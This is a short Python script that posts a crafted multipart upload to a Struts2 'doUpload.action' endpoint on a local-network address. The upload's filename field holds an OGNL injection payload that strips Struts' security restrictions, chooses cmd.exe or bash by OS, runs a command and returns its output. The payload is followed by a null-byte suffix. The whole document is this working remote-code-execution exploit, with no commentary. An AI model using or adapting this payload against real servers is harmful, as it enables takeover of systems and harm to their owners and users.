import requests

url = "http://192.168.20.130/doUpload.action"
boundary = "---------------------------WEBKIT198919991920098822555"
content_type = "multipart/form-data; boundary=%s" % boundary
payload = "--%s\r\n" % boundary
payload += "Content-Disposition: form-data; name=\"foo\"; filename=\""
payload += "%{(#_='multipart/form-data')."
payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
payload += "(#_memberAccess?"
payload += "(#_memberAccess=#dm):"
payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
payload += "(#ognlUtil.getExcludedPackageNames().clear())."
payload += "(#ognlUtil.getExcludedClasses().clear())."
payload += "(#context.setMemberAccess(#dm))))."
payload += "(#cmd='cmd.exe')."
payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
payload += "(#ros.flush())}\x00b\"\r\n"
payload += "Content-Type: text/plain\r\n\r\nzzzzz\r\n--%s--\r\n\r\n" % boundary
headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': content_type}
Attack_data = payload
request = requests.post(url, headers=headers, data=Attack_data).text
print(request)